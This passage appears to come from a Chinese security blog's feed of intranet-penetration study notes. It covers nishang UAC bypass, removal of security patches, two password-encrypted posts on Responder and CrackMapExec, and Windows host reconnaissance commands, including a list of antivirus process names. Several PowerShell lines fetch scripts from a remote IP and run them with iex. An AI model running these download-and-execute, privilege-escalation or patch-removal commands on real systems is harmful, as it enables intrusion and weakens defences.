class="hljs-string">&quot;powershell -windowstyle hidden -e Your EncodedPayload&quot;</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Invoke-PsUACme.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-Verbose</span>    <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107180006584.png" alt="image-20240107180006584"></p><ul><li><strong>删除补丁</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#移除目标机器上的所有更新补丁</span><br><span class="hljs-built_in">Remove-Update</span> All<br><span class="hljs-comment">#移除目标机器上的所有与安全相关更新</span><br><span class="hljs-built_in">Remove-Update</span> Security<br><span class="hljs-comment">#移除指定编号的更新</span><br><span class="hljs-built_in">Remove-Update</span> KB2761226<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Remove-Update.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Remove-Update</span> KB976902<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107180022062.png" alt="image-20240107180022062"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>nishang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>responder学习</title>
    <link href="/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="26b70d3ecf4f8b29a442314291161b5fb25bce8311d8ee7b501583beb8f3ef08"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>responder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CrackMapExec使用</title>
    <link href="/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/"/>
    <url>/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c0d0e9a3dffa910191d6c4c792dff8c29c4f89d751aa7422c0c1dc281a4b1c43">098d9f64412ee3ba7b7422d539a1fc877472f106cbe55dc475402782c6a4c35c30ec24b4aef5741eb22bccf15c37eaf6fa13ed802ef7c1e993ae929e55cef1cfcfece56662a3adc523999cd2caba48e9d98edfa17f3323903f0259af5310f85b77d8b1d60797399db5448b5fe9c3e45ee6d41c3e13e112e820d49af0a508666c01ead4e8904d13d644f6d37cdd6810caa0b7371fb3237dcf53746f77b0e050dbda13937b8d8ea247f89e43e593afa5272086ff03a7c593e0e2bdc41af952b32f29c72a232a1751f5b8f5e75dc71410a764512b54a27bd4a2edcad757818cfc641963332525a157ad67b172110495baf06526762a583b02fe4dff8c49e24b5cf1e5fe69f4780db6b086f2fde4b91748d594abfc6b8454e307b106f3405fdc3d924e21740508b9c5d57aece52a6210cd28557a09557cd52c12482fa07fcb304922f03c17a9a9895d96c976aa54633769174fa58119163352d96ea6a71054db0bbc007e5c58b54f2bcc9b5d4824198988535baad1b3038e2d952e055d2423ccd19cd89bc6766346bc85aa8453e4d4ea36cc98c9c598bae4dac1951c304eeb6f7e798106300eedb55ae560f6f03aa7ed37aed3835344f1c9b4ec8ba6aae32750a330405c4cabf9fd907eafd2083fa95feef432e40affdc0e5ba64021b4fa60f17d8f7505d5a1301f588ac608c5fd24fe42d61787fb130925b715d0cb08729537c8d1f3af8dc763cc9f111dbface6ce9153920b719857a419e1f39b647b1e2a0c50b72e703b198b6869857f3ca7edc0f9ce71669340c4566bed0b07fd9bec79f34812ceddc28e9ddce1a551332728c7cb6891348c19f3d2fc68a60b668b6b03a791b90e936aa5ea71cddc3b8f9559b810989b5c238916fe4b3d8a57201133a31a466a88c7e7ca431788826429e8d4cdabe192e0f7630102244191316e037a4f60194edea333eec6a3dd80778acbf12f0f18af1cc75c769374aa7c6abc2599dd90ef477b6b10ec77d832f463ee13eda8a575fdb3f602c6128786a8d304380880266bff9ec598c7f96719503ccfca47231dda52b203c89463bb5922186460ebb1fd1f53a618b4c93a6a0853bba4d67b97b77f238e206cee6586b6b40204de3747b1ed1ae93012748b21ba32f2a4a0c3daea7cb30416607dfb065259dea6bd46673f28b4731e9ed78f817da1288bdaa3733e1b92152dc56ea4e88a32666a03c1700ca155cbf2b36f034afa2dbcc56f939be357e6c4b25e83fc5ebaf4524edefa8a9edfe360d4ff00e593758ace31a3cff959264060fc07e2a92efdf85875854dbabd3fe8f7e42d18b6f884814e2fcb59be507078f2225b785b820c69bbb3f077da2a1078d7be49b9cd8f2defc0449543f3bac7e042c006faba29696523b0c3e0a5c5c42bfa86f278f66485d8b8a78b98625b3217d195ffc42323bb2e32f1f3fad00b45ba7ead8e997ce1da9f819caabb9a573b25f95b3e14756fae1c287470380c66bc2edbafe0620202f62c1c2ac80b743cf0ec10faa95450ec0f53c3d72f6b5e1680e9b114fb8ce95b6a8c8b7bb25cc8002e5a69745f5300e1d1d0e3db071f741f22be61cdd55619926371272a58a01e820e0e6daaeb0b6c4661a9c3b52b3a768afaf5855c530ec97b5106974aee697b3b8977eca336839d2a4213e933820edb0b49e59d4687374e8ed825bf9c536da435ff64eb22ff3c1a969edb957183e7ce43edf8b5bf8a8a6c2bd3ff9beaf37641d8abc62b33267b707d0e6c153ed6a292a2102a3b5557b850629919d57209dbd4185d2f107295c5b4ada1de93aced6b12d712b4c958108e063782967daeca444f5e90483308ed63f4307f0a0f0d4d6bf035744bb1a1d09040b614c62ad5302b636d4abfcb67540323738f4f3b767da23137eff52c83a62210ab14f6f73cd6c1c19e119b77ee982d3459823526ac127ea32d57b48dce49dacbabaad04edd14ff1a60672d962f16b18b40e7f7751ebbeb1aced0a1d94c1014603ba91568347cd14cb657644511e4ea86458d1ae0794b567c851c00d05a5bb233b053b4d1e0abba801ccd5c594833325e00b637833a15e900940b9fc653f3374a08e736cbd0b078f2f5741ae27837ac52d564dd40a8eb6897eb1ddde3cf8a16e874bc888a97d19fb52d8d5f68420e28e9bc3aeda7b800dc9df70338001dcf73fc67e0b664ecbe9eb0db8ba4fce8fb5afa6bfca08b48ff62a615d73d1c0f6c22e520582647ff7ccd05f926a821ef6fdaba356189972609b16149edd3c5867675335f9e0e44b68236f1bee6ddf58b866f87a01433fd87a626706c4edae1b2184ce3659369597846c13d7dec16eb0dfe104aa1b10b6ec31c7e12915bff6d21b14db2e30179e6446f3e2f387f8d6b2ff19c1f51dd37c3ecf24cfd2b793a0fb6cb2723e8b6f5e069cf18bbcea8f562e40dcb190927ee60d7108f69148d3d6b7acbace0bec242447250c3f8211fbd735a3d44371c7293385754a719208d33069a4e4bceb247ab9ac26c52178f695b238993fb517fed5704bcc69e68ed466d31026ff402ead31e4fda4f0423aa9db7bfc0974c6c8d381a3d000978ae9fe4e31fe9e6fef8dfca670f3bec0f411f9c13d5b83abb8503203329a1834c1a8070f99301873ca8391e12946f8ae436e209729f8a44e8018d58552bfe79857b0b928d5efee9e9bde74b4081ddc005c41e0eaa156af08a71eb1de1d7175250c0c3b4b69610b3264a39e425087f8031610e2b52e4253f9666d021a5989346622bf15d613dadcb4840919446f78d73effd075db343f3341b694de333d35516075eb0e0d2865160cefc47800dd186e51cc9c7e8224705a101e6de60531d68139412eb54999dacc10e4de3545e9a57d90727def808e299d0db536c2ff3e313c765cf25158a9b60227d7b52dbeb19df27950ad95438866e7e7b316ce79463abe211e8ff65ff2b73493e99fd55ad4b45a08db865a92458c4d31029d8534e1d9d7586d17e4ab1e7e594dbd5538141ccdc9c615490f9234a58c2d992cab60678aa9b3c45b1759aaf1bf5fcf06ebc392d5644fcd5e288954839c48d32154a5ed4024e39e3c8285912d3365001b57e76b8393ba82908ae5eb7b0428b96b51371e71da1c5de06b8108c651f4d971a2bd803ab95467a71f1f52e1d0c0d1ba6b71f733cddcc349b40a7ea8586fabf6e93b667aeede8ba588b0405bc6f422256e4c187d286a2058515e3a9c0c19ca99433b35d014e2695029d650f10a48f3598718f86901885d25a64242cb5d350a2c16d625172d5f7ac4a3b792c788ae55f9faaf7a362b3b67de2b5249a0daea54a812c96e2b3b6394be728969a1c4394396906c88a23614297f148c9789e86a96a85cbe0deeb0d9f8ba390919ff6fc71e4f24b28d02c1f4235f55deea2a5e8475ce44e761467efa9cc7ab565fa32d1fe159a5f4e2975580d957b85a83105a04d7da6d0922a21bec16b70bb238b305a4bcf1e6a9241d5e63dc0f5d5c915086879c9edcdd4e99018df79f43830f1c687883d3a8b1a0df4b2942fe52e54b38e2d755d68bb27a47cc04f22671ca2f1a5bf21fb2b2f1a9be16402673fd49c95fc901fd517a7b2e351d1e0f368e016cd1f3412c600269eb291334ea4bd45aecd4066cce4f0d6d00b07ef232a6d39ddf71e63978164d158838a06e402bce5077a686e62fac01009c4ec0ebb6b11e063fc9644521592b4dacb7b1228af852177b26534166270fcd58cd796b3bffc9347274b8a3382c2806758cd123ef1606db3f14b939f90b75fbbef30efe6bb9d2340d2e4c8f265530c5e7032d96d48ccefaa9e2c4563f36ec3083033f77641002552bfdac1c44c40a85d0f3ac3b99114223feb5ceeecb750a8c20f790ce9ee4439eec7ad3e6061ac0d7d9fc570c1cf43132673436ca1b8a166ebcbf34002ce80de0113dba037da7893f78fc8ba4a5a538c160d6338750c18a9721b20826cf1de8badf1b8846ab6a3bb9ed39b5bb6b6350f19b659bcdb640e75e77b57936e6c6b9f2ea49c3a166047b1a35ef34d3a4add8ad20ede2dd619211e2f0f1603947f02609f7e0acae953f65ec89e9604560f7fb43a79419d7cf741eeceb68d009c10e9c4d93f8a36399a537125684db940aab3c9057982f067715b78dbe94a14050964b88686c2e189ef1578d04daaae1ab5a244a0c11b027b0280acd75f67b982079381827fedafa3179c19500ccf9d53a21528211e8cb8dfe0cf5b364ff3353ddb0d7fe521a0269f455a54816f261e34fc17d33fe29622565ecbb052bc173b75ef1fab7a62c92f817819fad91807a8ade531f896bd40a931683ede2d03b0bbc46988e57ecc3ee4fd5a4a9931fbf700668fc93935daa17e9c3f809a0914c248124a7c2ce1cda53c082c427936854907c6d2520b4573e1cf119f08e4f037ca3efb17ec10153c9bfbcf3c558886b7fa3e01ac120ab372b1d9bd6e55f1c9d8dcbb99cf68b0084bbdb72e104c6f5dc8019bd0ae4ef6d549c5dc4c8efde68db08f87f07ed5723c3bb6360e9313b5b52265e5bd672e458b1772198f670ad8ca324067ba2b051cdb9f99da43d69dcd414154f7f3ca0ae053fb88e506c10ae3ed25983e431caf0dedbe7a292421f699b9e5666ae9f5cfb6fedaf29b0f28401b7bc4d704f796522fb331847f7b38f5a1c83ef5c89383ed1d0bc212fcb78d88430cbc12711e8c116e3792e30bc2170971904b6c7950135ef0a1ea69458ba9bdc6390ccd78891c2883147f562ece0a7fa23df204250bdabfc4fda9e2f7f7a0ba40d4fd11b86ec90e6a63699ab98118e045742dc672227b3c48ac565eafec112344d46237b7b9a1a606d44e5913ae1aa7109fcb39e074ee70ce75d8b6595090b96526133a5e71e7e29d1830d3aa06d0a45dd49c37a5a69e5eb87b3fd0391163250669bd87e05dda47ad7f3527452d97d77257759abc181829a6e5e5e6d9f7ee4cb145e58d67d0a4ab8b445588c21028d3ff093eecfc262ef1522c11c1da66eae8b0fcbf7c6577428a6dcbfd0b5820db5f370812e3595268d4f2cb13dda27c4716eadb208a4dfbef30e81348a9d7abfec8d088dad6a46c63758d4f3431785a7e4e7e4f05fe88d44a24055b3c900839f57cfebc19c0026ccbf28497355302a6657d9d5d22b77e0c77a9a019ff05be6a00600e6b52f2e65bd07f7b39b2a348459de63a9436569fd21a50e19828a03cbcb56e8c16fa4f0d1001fef1dff0ee959ffb474e019380d04414a604c99447967bfee40b483edc63cc1986dfb13c99dfc451af61e65a10c998fa74a05f471b4dc6bcea84df318f41d97d8e871f540008fc5d01ed4c389d84dbf99fa5e577a3e570b13697fc449b64c922759f781dcc653300300e07beb07077ff74799fd4982bb13b1d5b7680f6ba0ddb4a23e432db45e9eee9a6fc99d8be2707497b12100cda93759bbfe093e7229fff650d305a555f72970a52ffd013e86fc46052e514959c630d5c5770151b511ffd7ee7376767482057bd132b16eb2f437ba352bbc5ebcd6c62986c9780b59db4ef8f8a848d24346e29ff71dbe24fa0db2b80d00e0e3ac864ca52cf1b678d7720d72f2bee66c056da86f043d9b775df7f774ca81f6f65a73916947dff93aee7e3f0b4e5a946c986fa60cc499a334b3c03bae5a4c4f392d764530fcbfec1705aecefb14d535284531d320b33e2fe89764a20fd98144562f0d695830f76a2be786352b1325591f79274458a0b6a2d477d49a7a3a280ab1055280277b73bc597d341eb9970893a46fdc3d95e7294d3742d1849f1251916225c4806ee2ca90a3e3243966038699e902b65a4db4f7ce272cced0a26a6fdc6004a4969d4ff0d8ecb582a03f66707cb88c56ad4a66a8ff76d19bc23aadb7b102d74e218f6519fe94da1b69d4ce67fcc64f982e2edb2227884cfa618a5fb3b9d0377d0d2562dc9ef1a0f82ef073e8ee0a3a879dea473205b84c38b298776deb29a8ae2075d86f054b1752642f38c128b76b5e48299a3fab40a23ff0b3598b328f20965d7b8461a7296a29164829c8fdf5d47cad79ceb9db622337649c7c0667b68bd459c1589c4632c39c56e118702b08655314d48a14515e1bd240f200040bd4190d0273aec4dd31439e816e77c115f618682cb273394be13b99f69d0fdc48d62802eea0d457a52f43d6bdfbe82908f25e3782fae274baaaee61c38d32f76c3cf6dea07ec190968bbf4c4e25518e6ee2caef68ef7a4e5651b65d24d79a802094925c1802bfa722be217b552050022166e424c4944d858913f04011be04dce08238e32a926f0e082ed1155f6fac8526db2c72ba4e7b9dde03b9f04b17001c3d5deac0ab357a100e413bd285a2c46c964a027bf2503938b40b4071bf94d396d0ac0c3e266863e39644c6e06c2c1966de0792f0144e83d4905ca435df54a792c2b262dde311c5094a16036528b8d9c54998592886e4d3a902bc960ef1022f1552e87898d9d11a3529f4e11861c528429afd394f27d7331e881fbbd3c3dd4ed1a63c8b2089414c65449fc800830d0e1abb537e2bf548ade356538f7a70cb64116d9e5001a508a27a4d10db6a136b6ecb60749c4179266ea1911f173c86777a7e6059fda464b210149396333d743eccec5b788a6ce4cd968b593e98bb4aaaed4c121315baad39f11ef3d3953e0ebafd22708f3f473db1063cfc06535f863e515b571f47c4cc72da619e48896c49c9a76b9d00df6a1839070a713e91d3652290850dcf271a1b9ed7a78e2ab2fdb7ece763daa802d0381a044a2330a58ad59cd1edc4c2f09f4a407c57d0a144552c5602b67c53477eac792c30a2569c0f7ca5bc2332fe8bb46d879b6e952279974c693ad54852cd496f64d1d0684158eb2622a2d0c24021e1fad6189070bc38444f4b6c7039df4b374fcce0de6ec449413451343613517f2bc915ef6e7fca1c83fd0ba1cb57adcf6e5241d45653cd31c144ab765b2c262ed00ac2a599613c52b53b698494fdcd3ad5ba016cf425a473d9caa9b91be2c983f82a3756ccef4908d0b4afce7d9c741dd5f37ae3327509e09d77d1951655a5cc0df5e72326bed4f3c0907aa8733693c3977faef5ea8e10ec10e0b22656a14d302898a1a146e001780e6f1ce572b5a52e6c39359c7e8009a50b9340e4624406446bda480091dd339a208932b49d6445808452dc773390650b13c19283df7b318ae520ac7513d77919ebf33d9b2e6859cbff5be5c9a7d370293c8c007aeb568f3e2b89b59a425f495634eab9aa9f2753dc713d4a59f1ab550f7b36e3d4cc166f8a9f6ad88fdb413922d2724cb7a4e94bf2160aceb203803509d6a9e24ae449d71f0cec774de9db76eca1a301c77f9dc0867f96a4b444865036eac1aa5baf709a03e9781c3743be3dc61bba2cdd174674f393bc0c7872d41188d1f1f6135be9c7e56956a65944eb1638e39139c8cd417ef1fd32389efa55b814b45c5409e80258fdbb1092185777580dd00d138548c6743316d16ddbb4b41f0dc2ca7e0b1555a5e8298c2d68116ed8d71d47dc7358f794d4d98af4309c55b81189f535ac4bc79800db264513699a99c2480952b372ba2605d81df7972a03cb9d2e6d36c964bca723fe48aaa356e7d42a34ff3f491359c3bc4389dc7f1c808b8d70a1459c611fee0fdee7c3dcb7daf37a66deccf0637a46738cf2dda3cf0370480daae60c8ebb88a4a0e035111ed364264b6388ecc2ed4b47d47201474e0fd18dfd3d775563cd27f9003b749971d92b2806e45964f3fd84a653f3f84bbb2ae16d2141f9fd93a0977c4fd7657dcadb278ca80a2d397a3975d3db8c0d3811159288640bf3e0ffb26aa0d6a5a870171c9b70aff29a1cf34abff9ee755912e1f9c03f12e8da7948ad2a56419b414b8cef999896f774c4d7c5a54a1177514cac29b47c36234a72b9eb8cf1b65f5b655852827768882dd741f39da077c8e93b3e8d635b9a97de2dc97d82bc0852ede0e19fc9c61bbe91cf3158c10ab0b7fc036945e25f8d44c80996c59181fdd8bbd9def0dd89fae6b6fa921108780b009b31067f50e00e906e77a31977c01e2981046b122386b816e1fffd7ab0549ea4bcffbcf6d3a5ed76a75f485f608277c649709d1a03113e3f46be8f247797d06bff19a0a0694bcc7ff37cd257502ad6ef8a7db885b015f30e1e3505fc7acb4ebe67d89995ee301a876429885393f1fdb20d9221edd3b59bcb96820beccb867763d3fef2cfc7047055d5377b97fa321131b4c7aacbbf677c695ad598ac831bc5ee6fe83cb0c786e58a0b6c3d65e7d2e07356fc237b04b2d0c9fbb1b381e6be40a3284d4e6d805fe1184a4fd0c62156c5508cac4abd317b5abd6ce2d0e0dd5401ad8d5bf8f732eb7e839231d627328fc178feffb57d47ed92ed735cdf148a11690ea5f59f4d702fe3c3e14a000668ababd247b4b03ed4adfc8454b3ac6409fb8d3652c2f22e9160c02aff3652a58929f90995c20ecb7ff70989dedb9f9e3cdc08ac6107ac945b265fa7c8d68d8ea333496fcbde30c7aaeea56632ea76eb7b85996892a094f888988520fd089d85fc638fb7c629763255c78aa599316aafbf5d6cc70a7aca068532faad8bb0ec13b839bd097a81496c23f415775caa13085bf70b71181602ec7a2429bafe4b9de237a09b18e6aedb7643a78b763e7ccf0ae9c151fa072ca7a70d090369d03d236a99918b3e6d1b96b304f01f5839c1b81bbc0250f9dfc6fb9202a6dfe01dcb9d0b59334b2ac559995de0da6f3c3d6627f370aa0925979608c4041b269e32336656cfa9e935cbfffe638f26f2c5fbba31f41bc0e2e7e528771e45b804a9339a6705f01c9cd6daa7e349fec590413baf71e31891f0f79698ca4cce77df06266568d2522342312bf1479688d25c585900cf751062dc7ef501e51ce7841e8dc27c5cc6a4bb138d02dc75392247455d265df4b85d4c0b7805ae176d32f687003a0e5467ad00b1ef31a122163ec574801a9fcb0d256c0f87032ff89c483132db12752d25c8a1357af61d336d10727372a543b6033cfc839565345ef1d9827ff1e7560dc38845f3d9eb016d10f77b55edf862685789f2e3df9114bd829e4b2cef82d2f4d8327f07b38187812221ae79ab512832b485bd86537fb62ac60c3f6f99bc4c54c2496c2372ad567d803c2aea38a6684af65c32d8bb81f08e2d8397d1333571ba8058900c58000301aa7df17ab07b1a5f6a60fad6ae45709c4ee340a44741ce8045ddb4fe8ec27c646d19f8443a1f588092e23a19f08cb8d01d81f07d7618742dd050d9790fbb4a4b03135ab4e265b0d4fcd163978f1a0d4fe7ff83f7ef34e0d8716f96725845bb6882e39943b88b60b7826cd8862830ee79fb24a47e46d8529c038fe07e57f8dcd7127a5f1b4ec20defa9bebd5bea19dc7c6f28a94ccd19ef33898e9f07e0e3fa30d81657cc9a918d7a813b75146ce0113f94cb4cb401a741915d01ac19b8bbf88ee39df3372486d8325a694afe9b1b0ed90ac7db4f1c9c32aa6715c9032b989d413271b21025fa662b0959028d48734d5d56a7b2b77971408c2d88e1a9a1304ce9bb4af3af50f5d658f04378c7168056c003afe9e3d47dd40e73d926aa0daedb2b87a393fe0ece8d7b4dd7169534c6b921a8ce15ef9d27f7b09ed2b604a041da91ded94ab799e5c23d861a444a0886e356b46134e576a606ba7546fefd575ae6194e2a08c553c64af11476682f7484214680a7a653f5048286bdbbc568218b264f83759b57a4a7468f984159eb7bc3cbb53524fc23435ba7592593920cb8ddc7992558ec9452b4fcc66d2df4a2f4f5c9dcb15486d140156c9bf41d0581c4ff197fbbb8d254db1f02e46448c0ed788d14164ec616952629515fbc1cff622e395b06b8c8eb53e67ba6ff25e436d163fbe5b4018d00bebd4225e9d7ae0a29d16e71b7c48cc85c4bc429b681109141983fc3b0ce94f4d340f4ad0494357da19d04a1c67767e226b06ae5452aea40cecf2ca9c800427bf01b17ebe1e1c3bab6c29473d9eccf81c33f931480552e068c770fcddee3499288b20bcd3b8e59db1d2186087d088b2653f85f3956c22aa8780a892cb11821f28c7247753125613d2a2edbb9471d517705807caf9e5186ef089f87c503e6a8da36c0867e6984096bbdb58c5337cc9f2a930a480d8ed70814ec0479bcf4c5ca88d3ddccf9f81e231d08e116ee45a17756f06e5f46b895a7bf8b522e1aea67897bfe6b3d4ea7be74850aa45cdb51b426b940461c5dd4e521a19252519cc335aa8de56c029d09f63cb15417aad616cd454c1d2b972ea86fd8c43daff333ef22e7340aaffe4ef44e743a36519ce91754267a10a65992585ab574915edcbe67182e9ea5fcbb315b92cdad35eaa25b4afecc56dac6768ebe06836c9bbfc39d92b8799a9dabafd1e2b64876c05b4ce78ff07a26a32513f78f086dcb1de722ef5f428f382baf72028190883f16038a8bce15c4b9b8412a0c658df18f7cd16862eb40457f0a434c042747a403fa238cf5c0475cfbf9853b86a1976bb3535ea20896c85c5355c9c6782a5014eb78f1b5d197c6c72ccb4b7409d20721755f0ff8532d40d23c74d0df1dcd6352cc49b1a7d52baa4bd2c25ce4eec7ea2486c7d426fd865412a2f847d48adfb98b8cc990d8c3d2a9c741912b14236cfc89f30ef9dd03992e3cf18a3233b1eaa25d771b254c465093c859c3a6b2b6e0a7c0cd21842497aaa521abee5ad096906f9dbeb792c4d3adf1b8ee106ac5e4d11fcfadc072ab1eab44f85130dc2f5e78af9b6509b93032d4a3fda0ba289b6de7f439d1b1781364fc51399ce3993611bf8167750ca471e9a5f59f981f77e77ba5a9fa29a6fc39cc03e1548699e7fc6bef85e1f2fea063df1a0633c741acfe1b3eed496934fa075d46461107fec980cfa78bbbc76f5f770ea51dc744958f24a66cf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>CrackMapExec</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>1.查询网络配置命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>2.查询操作系统及软件的信息<br>1）查看操作系统和版本信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br><span class="hljs-string">//</span>适用于英文的操作系统，中文的：<br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br></code></pre></td></tr></table></figure><p>2）查看系统体系结构</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> <span class="hljs-variable">%PROCESSOR_ARCHITECTURE%</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107163924212.png" alt="image-20240107163924212"></p><ol start="3"><li>查看安装的软件及版本、路径等</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107163938696.png" alt="image-20240107163938696"></p><p>Powershell版本：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">powershell.exe &quot;Get-WmiObject -class Win32_Product | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> -Property name,Version<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107163950126.png" alt="image-20240107163950126"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-Host</span><br><span class="hljs-variable">$PSVersionTable</span>.PSVERSION<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240108104032647.png" alt="image-20240108104032647"></p><p>3.查询本机服务信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service list brief<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164003743.png" alt="image-20240107164003743"><br>4.查询进程列表</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">tasklist<br><span class="hljs-comment">//或者</span><br>wmic process list brief<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164012309.png" alt="image-20240107164012309"></p><p>常见杀毒软件进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">360s</span>d<span class="hljs-selector-class">.exe</span><br><span class="hljs-number">360</span>tray<span 